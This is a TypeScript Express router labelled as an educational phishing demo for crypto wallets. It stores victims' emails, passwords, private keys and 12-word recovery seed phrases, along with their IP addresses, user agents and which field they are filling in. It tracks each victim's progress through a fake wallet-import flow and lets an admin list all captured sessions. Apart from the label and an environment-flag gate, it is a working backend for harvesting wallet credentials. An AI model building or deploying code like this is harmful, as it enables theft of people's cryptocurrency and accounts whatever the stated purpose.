import { Router } from 'express'
import { requireAdmin } from '../middleware/auth'
import {
  clearEduPhishSessions,
  createEduPhishSession,
  isEduPhishDemoEnabled,
  listEduPhishSessions,
  updateEduPhishSession,
  type EduPhishStep,
} from '../lib/eduPhishStore'

export const eduPhishRoutes = Router()

function demoDisabled(_req: import('express').Request, res: import('express').Response) {
  return res.status(403).json({
    error: 'Educational phishing demo is disabled. Set EDU_PHISHING_DEMO=true on the API server.',
  })
}

function guardEnabled(
  req: import('express').Request,
  res: import('express').Response,
  next: import('express').NextFunction
) {
  if (!isEduPhishDemoEnabled()) return demoDisabled(req, res)
  next()
}

eduPhishRoutes.use(guardEnabled)

eduPhishRoutes.post('/sessions', (req, res) => {
  const walletBrand = String(req.body?.walletBrand || 'Unknown wallet').slice(0, 80)
  const pageUrl = String(req.body?.pageUrl || '').slice(0, 500)
  const session = createEduPhishSession({
    walletBrand,
    pageUrl,
    userAgent: String(req.headers['user-agent'] || '').slice(0, 500),
    clientIp: String(req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown').slice(0, 120),
  })
  return res.status(201).json({ session })
})

eduPhishRoutes.patch('/sessions/:id', (req, res) => {
  const { id } = req.params
  const step = req.body?.step as EduPhishStep | undefined
  const allowedSteps: EduPhishStep[] = ['connecting', 'import_prompt', 'recovery_form', 'submitted']
  if (step && !allowedSteps.includes(step)) {
    return res.status(400).json({ error: 'Invalid step' })
  }

  const seedWords = Array.isArray(req.body?.seedWords)
    ? req.body.seedWords.map((w: unknown) => String(w ?? '').slice(0, 80)).slice(0, 12)
    : undefined

  const updated = updateEduPhishSession(id, {
    step,
    email: req.body?.email !== undefined ? String(req.body.email).slice(0, 200) : undefined,
    password: req.body?.password !== undefined ? String(req.body.password).slice(0, 200) : undefined,
    privateKey: req.body?.privateKey !== undefined ? String(req.body.privateKey).slice(0, 500) : undefined,
    activeField: req.body?.activeField !== undefined ? String(req.body.activeField).slice(0, 80) : undefined,
    seedWords: seedWords
      ? [...seedWords, ...Array(Math.max(0, 12 - seedWords.length)).fill('')].slice(0, 12)
      : undefined,
  })

  if (!updated) return res.status(404).json({ error: 'Session not found' })
  return res.json({ session: updated })
})

eduPhishRoutes.get('/admin/sessions', requireAdmin, (_req, res) => {
  return res.json({ sessions: listEduPhishSessions() })
})

eduPhishRoutes.delete('/admin/sessions', requireAdmin, (_req, res) => {
  const cleared = clearEduPhishSessions()
  return res.json({ cleared })
})
